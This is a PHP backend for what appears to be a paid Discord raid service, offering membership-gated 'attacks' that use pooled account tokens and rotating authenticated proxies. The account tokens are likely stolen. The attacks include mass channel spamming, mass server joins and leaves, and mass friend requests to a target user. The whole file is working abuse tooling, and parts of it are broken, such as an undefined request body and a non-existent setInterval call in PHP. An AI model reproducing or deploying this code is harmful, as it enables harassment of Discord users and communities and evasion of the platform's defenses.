<?php

session_start();
ob_start();

require_once '../@/config.php';
require_once '../@/functions.php';

$user = new users;
$d = array();

if (!(isset($_SERVER['HTTP_REFERER'])) && $_SERVER['REQUEST_METHOD'] != 'POST') {
    $d["status"] = "non";
    $d["erreur"] = "Internal Server Error !";
    die('Bien essayé ... ');
    exit();
}


if(!($user -> UserIsConnected())){
    $d["status"] = "non";
    $d["message"] = "No connected";
}

if(!($user -> hasMembership($odb))){
    $d["status"] = "non";
    $d["message"] = "You don't have a Membership !";
}

$type = $_POST['type'];

if($type == "message"){
    $invite = $_POST['invite'];
    $channelID = $_POST['channelID'];
    $message = $_POST['message'];
    $time = $_POST['time'];
    $bots =  $_POST['bots'];

    if($invite == "" || $channelID == "" || $message == "" || $time == "" || $bots == "" || !(is_numeric($channelID)) || !(is_numeric($time)) || !(is_numeric($bots))){
        $d["status"] = "non";
        $d["message"] = "All fields required or Channel ID, Time and Bots is not a number !";
    } else {
        $reqtoken = $odb -> prepare('SELECT token FROM tokens ORDER BY RAND() LIMIT ' . intval($bots));
        $reqtoken->execute();
        $result = $reqtoken->setFetchMode(PDO::FETCH_ASSOC);

        while($row = $reqtoken->fetch()){
            $resultset[] = $row['token'];
        }

        $f_contents = file("proxies.txt");
        $line = $f_contents[array_rand ($f_contents)];

        $proxies_ip = explode(":", $line)[0];
        $proxies_port = explode(":", $line)[1];

        $proxies_user = explode(":", $line)[2];
        $proxies_password = explode(":", $line)[3];

        $proxies = $proxies_ip . ":" . $proxies_port;
        $proxiesauth = $proxies_user . ":" . $proxies_password;

        foreach ($resultset as &$token) {
            $url = 'https://discordapp.com/api/v6/invite/'.$invite;
            $ch = curl_init($url);
            $options = array(
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HEADER         => false,
                CURLOPT_FOLLOWLOCATION => false,
                CURLOPT_PROXY          => $proxies,
                CURLOPT_PROXYUSERPWD   => $proxiesauth,
                CURLOPT_AUTOREFERER    => true,
                CURLOPT_CONNECTTIMEOUT => 20,
                CURLOPT_TIMEOUT        => 20,
                CURLOPT_POST           => 1,
                CURLOPT_POSTFIELDS     => $request,
                CURLOPT_SSL_VERIFYHOST => 0,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_VERBOSE        => 1,
                CURLOPT_HTTPHEADER     => array(
                    "Authorization: $token"
                )
            );

            curl_setopt_array($ch,$options);
            $data = curl_exec($ch);
            curl_close($ch);
        }

        $endtime = time() + intval($time);

        setInterval(function()
        {
            foreach ($resultset as &$token) {
                $url = 'https://discordapp.com/api/v6/channels/'.$channelID.'/messages';

                $request2 = array(
                    'content' => $message
                );

                $request = json_encode($request2);
                $ch = curl_init($url);
                $options = array(
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_HEADER         => false,
                    CURLOPT_FOLLOWLOCATION => false,
                    CURLOPT_PROXY          => $proxies,
                    CURLOPT_PROXYUSERPWD   => $proxiesauth,
                    CURLOPT_AUTOREFERER    => true,
                    CURLOPT_CONNECTTIMEOUT => 20,
                    CURLOPT_TIMEOUT        => 20,
                    CURLOPT_POST            => 1,
                    CURLOPT_POSTFIELDS     => $request,
                    CURLOPT_SSL_VERIFYHOST => 0,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_VERBOSE        => 1,
                    CURLOPT_HTTPHEADER     => array(
                        "Authorization: $token"
                    )
                );

                curl_setopt_array($ch,$options);
                $data = curl_exec($ch);
                curl_close($ch);
            }
        }, intval($endtime));

        $d["status"] = "oui";
        $d["message"] = "Attack sent !";

    }
} elseif ($type == "join") {    
    $invite = $_POST['invite'];
    $bots = $_POST['bots'];

    if($invite == "" || $bots == "" || !(is_numeric($bots))){
        $d["status"] = "non";
        $d["message"] = "All fields required or bots is not a number !";
    } else {
        $reqtoken = $odb -> prepare('SELECT token FROM tokens ORDER BY RAND() LIMIT ' . intval($bots));
        $reqtoken->execute();
        $result = $reqtoken->setFetchMode(PDO::FETCH_ASSOC);

        while($row = $reqtoken->fetch()){
            $resultset[] = $row['token'];
        }

        $f_contents = file("proxies.txt");
        $line = $f_contents[array_rand ($f_contents)];

        $proxies_ip = explode(":", $line)[0];
        $proxies_port = explode(":", $line)[1];

        $proxies_user = explode(":", $line)[2];
        $proxies_password = explode(":", $line)[3];

        $proxies = $proxies_ip . ":" . $proxies_port;
        $proxiesauth = $proxies_user . ":" . $proxies_password;

        foreach ($resultset as &$token) {
            $url = 'https://discordapp.com/api/v6/invite/'.$invite;
            $ch = curl_init($url);
            $options = array(
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HEADER         => false,
                CURLOPT_FOLLOWLOCATION => false,
                CURLOPT_PROXY          => $proxies,
                CURLOPT_PROXYUSERPWD   => $proxiesauth,
                CURLOPT_AUTOREFERER    => true,
                CURLOPT_CONNECTTIMEOUT => 20,
                CURLOPT_TIMEOUT        => 20,
                CURLOPT_POST           => 1,
                CURLOPT_POSTFIELDS     => $request,
                CURLOPT_SSL_VERIFYHOST => 0,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_VERBOSE        => 1,
                CURLOPT_HTTPHEADER     => array(
                    "Authorization: $token"
                )
            );

            curl_setopt_array($ch,$options);
            $data = curl_exec($ch);
            curl_close($ch);
        }

        $d["status"] = "oui";
        $d["message"] = "Attack sent !";

    }
} elseif ($type == "leave") {
    $guildID = $_POST['guildID'];
    if($guildID == "" || !(is_numeric($guildID))){
        $d["status"] = "non";
        $d["message"] = "All fields required or guild id is not a number !";
    } else {
        $reqtoken = $odb -> prepare('SELECT token FROM tokens ORDER BY RAND()');
        $reqtoken->execute();
        $result = $reqtoken->setFetchMode(PDO::FETCH_ASSOC);

        while($row = $reqtoken->fetch()){
            $resultset[] = $row['token'];
        }

        $f_contents = file("proxies.txt");
        $line = $f_contents[array_rand ($f_contents)];

        $proxies_ip = explode(":", $line)[0];
        $proxies_port = explode(":", $line)[1];

        $proxies_user = explode(":", $line)[2];
        $proxies_password = explode(":", $line)[3];

        $proxies = $proxies_ip . ":" . $proxies_port;
        $proxiesauth = $proxies_user . ":" . $proxies_password;

        foreach ($resultset as &$token) {
            $url = 'https://discordapp.com/api/v6/users/@me/guilds/'.$guildID;
            $ch = curl_init($url);
            $options = array(
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HEADER         => false,
                CURLOPT_FOLLOWLOCATION => false,
                CURLOPT_PROXY          => $proxies,
                CURLOPT_PROXYUSERPWD   => $proxiesauth,
                CURLOPT_AUTOREFERER    => true,
                CURLOPT_CONNECTTIMEOUT => 20,
                CURLOPT_TIMEOUT        => 20,
                CURLOPT_CUSTOMREQUEST  => "DELETE",
                CURLOPT_VERBOSE        => 1,
                CURLOPT_HTTPHEADER     => array(
                    "Authorization: $token"
                )
            );

            curl_setopt_array($ch,$options);
            $data = curl_exec($ch);
            curl_close($ch);
        }

        $d["status"] = "oui";
        $d["message"] = "Attack sent !";
    }
} elseif ($type == "friends") {
    $user = $_POST['user'];
    $bots = $_POST['bots'];

    $username = explode("#", $user)[0];
    $tag = explode("#", $user)[1];

    if($user == ""  || $bots == "" || !(is_numeric($bots))){
        $d["status"] = "non";
        $d["message"] = "All fields required";
    } else {
        $reqtoken = $odb -> prepare('SELECT token FROM tokens ORDER BY RAND() LIMIT '. $bots);
        $reqtoken->execute();
        $result = $reqtoken->setFetchMode(PDO::FETCH_ASSOC);

        while($row = $reqtoken->fetch()){
            $resultset[] = $row['token'];
        }

        $f_contents = file("proxies.txt");
        $line = $f_contents[array_rand ($f_contents)];

        $proxies_ip = explode(":", $line)[0];
        $proxies_port = explode(":", $line)[1];

        $proxies_user = explode(":", $line)[2];
        $proxies_password = explode(":", $line)[3];

        $proxies = $proxies_ip . ":" . $proxies_port;
        $proxiesauth = $proxies_user . ":" . $proxies_password;

        foreach ($resultset as &$token) {
            $url = 'https://discordapp.com/api/v6/users/@me/relationships';

            $request2 = array(
                'username' => $username,
                'discriminator' => $tag
            );

            $request = json_encode($request2);

            $ch = curl_init($url);
            $options = array(
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HEADER         => false,
                CURLOPT_FOLLOWLOCATION => false,
                CURLOPT_PROXY          => $proxies,
                CURLOPT_PROXYUSERPWD   => $proxiesauth,
                CURLOPT_AUTOREFERER    => true,
                CURLOPT_CONNECTTIMEOUT => 20,
                CURLOPT_TIMEOUT        => 20,
                CURLOPT_POST           => 1,
                CURLOPT_POSTFIELDS     => $request,
                CURLOPT_VERBOSE        => 1,
                CURLOPT_HTTPHEADER     => array(
                    "Authorization: $token",
                    'Content-Type: application/json'
                )
            );

            curl_setopt_array($ch,$options);
            $data = curl_exec($ch);
            curl_close($ch);
        }

        $d["status"] = "oui";
        $d["message"] = "Attack sent !";
    }

} else {
    $d["status"] = "non";
    $d["message"] = "No attack provided !";
}

echo json_encode($d);
